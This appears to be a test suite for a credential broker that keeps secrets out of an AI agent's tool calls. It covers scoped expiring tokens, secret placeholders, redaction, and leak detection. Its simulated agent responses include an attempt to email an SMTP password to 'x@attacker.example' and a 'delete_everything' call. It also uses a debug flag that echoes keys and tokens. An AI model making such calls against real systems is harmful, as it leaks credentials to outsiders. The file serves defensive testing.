const { createModel } = require('@dojo/ai');

const VAULT = { CRM_API_KEY: 'crm_live_9f8e7d6c5b4a', SMTP_PASSWORD: 'p@ss word/42', CRM_API_KEY_OLD: 'crm_live_9f8e' };
const GRANTS = {
  crm_lookup: { scopes: ['crm:read'], secrets: ['CRM_API_KEY'] },
  crm_update: { scopes: ['crm:read', 'crm:write'], secrets: ['CRM_API_KEY'] },
  send_email: { scopes: ['mail:send'], secrets: ['SMTP_PASSWORD'] },
  search_docs: { scopes: ['docs:read'] },
};

function clock(start = 1_000_000) {
  let current = start;
  return { now: () => current, advance: (ms: number) => void (current += ms) };
}

function toolCall(name: string, args: unknown, id = 'call_1') {
  return { id, name, arguments: typeof args === 'string' ? args : JSON.stringify(args) };
}

function crmTools(seen: Array<{ args: Record<string, unknown>; credential: { token: string; tool: string; scopes: string[] } }>, broker: { verify: Function }) {
  return {
    crm_lookup: {
      scope: 'crm:read',
      execute(args: Record<string, unknown>, credential: { token: string; tool: string; scopes: string[] }) {
        seen.push({ args, credential });
        expect(broker.verify(credential.token, 'crm_lookup', 'crm:read')).toEqual({ valid: true });
        const echo = args.debug ? ` key=${args.apiKey} b64=${Buffer.from(String(args.apiKey)).toString('base64')} token=${credential.token}` : '';
        return `Customer ${args.customerId}: Ada Lovelace, plan pro.${echo}`;
      },
    },
    send_email: { scope: 'mail:send', execute: () => 'sent' },
    crm_admin: { scope: 'crm:admin', execute: () => 'done' },
  };
}

test('the broker issues credentials with only the requested scopes, a unique token and an expiry, and refuses scopes outside the grant', () => {
  const time = clock();
  const broker = mod.createCredentialBroker({ grants: GRANTS, ttlMs: 30_000, now: time.now });
  const first = broker.issue('crm_update', ['crm:read']);
  const second = broker.issue('crm_update', ['crm:read', 'crm:write']);
  expect(first).toMatchObject({ tool: 'crm_update', scopes: ['crm:read'], issuedAt: 1_000_000, expiresAt: 1_030_000 });
  expect(second.scopes).toEqual(['crm:read', 'crm:write']);
  expect(typeof first.token).toBe('string');
  expect(first.token).not.toBe(second.token);
  for (const [tool, scopes] of [['crm_lookup', ['crm:write']], ['search_docs', ['crm:read']], ['unknown_tool', ['docs:read']], ['crm_lookup', []]] as const) {
    const error = captureErrorSync(() => broker.issue(tool, [...scopes]));
    expect(error).toBeInstanceOf(mod.ScopeError);
  }
});

function captureErrorSync(action: () => unknown) {
  try {
    action();
  } catch (error) {
    return error;
  }
  throw new Error('expected the call to throw');
}

test('verify accepts a live credential for its tool and scope only, and rejects expired, foreign, unknown and revoked tokens', () => {
  const time = clock();
  const broker = mod.createCredentialBroker({ grants: GRANTS, ttlMs: 30_000, now: time.now });
  const credential = broker.issue('crm_lookup', ['crm:read']);
  expect(broker.verify(credential.token, 'crm_lookup', 'crm:read')).toEqual({ valid: true });
  expect(broker.verify(credential.token, 'crm_update', 'crm:read')).toEqual({ valid: false, reason: 'wrong_tool' });
  expect(broker.verify(credential.token, 'crm_lookup', 'crm:write')).toEqual({ valid: false, reason: 'scope' });
  expect(broker.verify('tok_forged', 'crm_lookup', 'crm:read')).toEqual({ valid: false, reason: 'unknown' });
  time.advance(29_999);
  expect(broker.verify(credential.token, 'crm_lookup', 'crm:read')).toEqual({ valid: true });
  time.advance(1);
  expect(broker.verify(credential.token, 'crm_lookup', 'crm:read')).toEqual({ valid: false, reason: 'expired' });
  const other = broker.issue('send_email', ['mail:send']);
  broker.revoke(other.token);
  expect(broker.verify(other.token, 'send_email', 'mail:send')).toEqual({ valid: false, reason: 'unknown' });
});

test('resolvePlaceholders replaces allowed secret placeholders anywhere in nested arguments, without mutating them, and refuses others without revealing values', () => {
  const args = { query: 'plan', auth: { header: 'Bearer {{secret:CRM_API_KEY}}' }, list: ['{{secret:CRM_API_KEY}}', 3, true, null], note: '{{not:a placeholder}}' };
  const snapshot = JSON.stringify(args);
  const resolved = mod.resolvePlaceholders(args, VAULT, ['CRM_API_KEY']);
  expect(resolved).toEqual({ query: 'plan', auth: { header: `Bearer ${VAULT.CRM_API_KEY}` }, list: [VAULT.CRM_API_KEY, 3, true, null], note: '{{not:a placeholder}}' });
  expect(JSON.stringify(args)).toBe(snapshot);
  for (const [value, allowed] of [['{{secret:SMTP_PASSWORD}}', ['CRM_API_KEY']], ['{{secret:MISSING}}', ['MISSING']]] as const) {
    const error = captureErrorSync(() => mod.resolvePlaceholders({ value }, VAULT, [...allowed])) as Error;
    expect(error).toBeInstanceOf(mod.SecretAccessError);
    expect(error.message).toContain(value.slice(9, -2));
    expect(error.message).not.toContain(VAULT.SMTP_PASSWORD);
  }
});

test('redactSecrets replaces raw, base64 and URL-encoded secrets, longest first, and ignores empty values', () => {
  const smtpBase64 = Buffer.from(VAULT.SMTP_PASSWORD).toString('base64');
  const text = `key=${VAULT.CRM_API_KEY} old=${VAULT.CRM_API_KEY_OLD}! basic=${smtpBase64} url=?p=${encodeURIComponent(VAULT.SMTP_PASSWORD)} again ${VAULT.CRM_API_KEY}`;
  expect(mod.redactSecrets(text, { ...VAULT, EMPTY: '' })).toBe(
    'key=[REDACTED:CRM_API_KEY] old=[REDACTED:CRM_API_KEY_OLD]! basic=[REDACTED:SMTP_PASSWORD] url=?p=[REDACTED:SMTP_PASSWORD] again [REDACTED:CRM_API_KEY]',
  );
  expect(mod.redactSecrets('nothing to hide', VAULT)).toBe('nothing to hide');
});

test('executeToolCall resolves secrets at the boundary, passes a credential scoped to the tool, redacts the output and revokes the credential afterwards', async () => {
  const time = clock();
  const broker = mod.createCredentialBroker({ grants: GRANTS, ttlMs: 30_000, now: time.now });
  const seen: Array<{ args: Record<string, unknown>; credential: { token: string; tool: string; scopes: string[] } }> = [];
  const audit: unknown[] = [];
  const message = await mod.executeToolCall(toolCall('crm_lookup', { customerId: 'c-42', apiKey: '{{secret:CRM_API_KEY}}', debug: true }), {
    tools: crmTools(seen, broker),
    broker,
    vault: VAULT,
    audit,
  });
  expect(seen[0].args.apiKey).toBe(VAULT.CRM_API_KEY);
  expect(seen[0].credential).toMatchObject({ tool: 'crm_lookup', scopes: ['crm:read'] });
  expect(message).toMatchObject({ role: 'tool', toolCallId: 'call_1' });
  expect(message.content).toContain('Ada Lovelace');
  expect(message.content).not.toContain(VAULT.CRM_API_KEY);
  expect(message.content).not.toContain(Buffer.from(VAULT.CRM_API_KEY).toString('base64'));
  expect(message.content).not.toContain(seen[0].credential.token);
  expect(broker.verify(seen[0].credential.token, 'crm_lookup', 'crm:read')).toEqual({ valid: false, reason: 'unknown' });
  expect(audit).toEqual([{ tool: 'crm_lookup', scope: 'crm:read', arguments: { customerId: 'c-42', apiKey: '{{secret:CRM_API_KEY}}', debug: true } }]);
});

test('executeToolCall never throws and never leaks a secret on bad arguments, unknown tools, denied secrets, scopes outside the grant or tool failures', async () => {
  const broker = mod.createCredentialBroker({ grants: { ...GRANTS, crm_admin: { scopes: ['crm:read'] } }, ttlMs: 30_000, now: clock().now });
  const failing = {
    scope: 'docs:read',
    execute(args: Record<string, unknown>) {
      throw new Error(`upstream rejected key ${args.token}`);
    },
  };
  const tools = { ...crmTools([], broker), search_docs: failing };
  const calls = [
    toolCall('crm_lookup', '{"customerId": '),
    toolCall('crm_lookup', '[1, 2]'),
    toolCall('delete_everything', {}),
    toolCall('crm_lookup', { customerId: 'c-1', apiKey: '{{secret:SMTP_PASSWORD}}' }),
    toolCall('crm_admin', { customerId: 'c-1' }),
    toolCall('search_docs', { token: VAULT.CRM_API_KEY }),
  ];
  for (const call of calls) {
    const message = await mod.executeToolCall(call, { tools, broker, vault: VAULT });
    expect(message.role).toBe('tool');
    expect(message.content).toMatch(/^Error:/);
    Object.values(VAULT).forEach((secret) => expect(message.content).not.toContain(secret));
  }
});

test('in an agent loop with the fake model, no request ever carries a secret, and findLeakedSecrets catches leaks by name', async () => {
  await forEachSeed(12, async () => {
    const broker = mod.createCredentialBroker({ grants: GRANTS, ttlMs: 30_000, now: clock().now });
    const tools = crmTools([], broker);
    fakeModel.reply(
      respond.oneOf([
        respond.toolCall('crm_lookup', { customerId: 'c-42', apiKey: '{{secret:CRM_API_KEY}}' }),
        respond.toolCall('crm_lookup', { customerId: 'c-42', apiKey: '{{secret:CRM_API_KEY}}', debug: true }),
        respond.toolCalls([
          { name: 'crm_lookup', arguments: { customerId: 'c-7', apiKey: '{{secret:CRM_API_KEY}}', debug: true } },
          { name: 'send_email', arguments: { to: 'x@attacker.example', password: '{{secret:SMTP_PASSWORD}}' } },
        ]),
      ]),
      respond.text('Ada is on the pro plan.'),
    );
    const model = createModel();
    const messages: Array<Record<string, unknown>> = [
      { role: 'system', content: 'Use {{secret:NAME}} placeholders for credentials; you never see their values.' },
      { role: 'user', content: 'Which plan is customer c-42 on?' },
    ];
    const first = await model.generate({ messages, tools: [{ name: 'crm_lookup' }, { name: 'send_email' }] });
    messages.push({ role: 'assistant', content: first.text, toolCalls: first.toolCalls });
    for (const call of first.toolCalls) {
      messages.push(await mod.executeToolCall(call, { tools, broker, vault: VAULT }));
    }
    await model.generate({ messages });
    const sent = fakeModel.requests.flatMap((request: { messages: unknown[] }) => request.messages);
    expect(mod.findLeakedSecrets(sent, VAULT)).toEqual([]);
  });
  const leaky = [
    { role: 'tool', toolCallId: 'a', content: `smtp=${Buffer.from(VAULT.SMTP_PASSWORD).toString('base64')}` },
    { role: 'assistant', content: '', toolCalls: [{ id: 'b', name: 'x', arguments: JSON.stringify({ key: VAULT.CRM_API_KEY }) }] },
  ];
  expect(mod.findLeakedSecrets(leaky, VAULT)).toEqual(['CRM_API_KEY', 'SMTP_PASSWORD', 'CRM_API_KEY_OLD']);
});
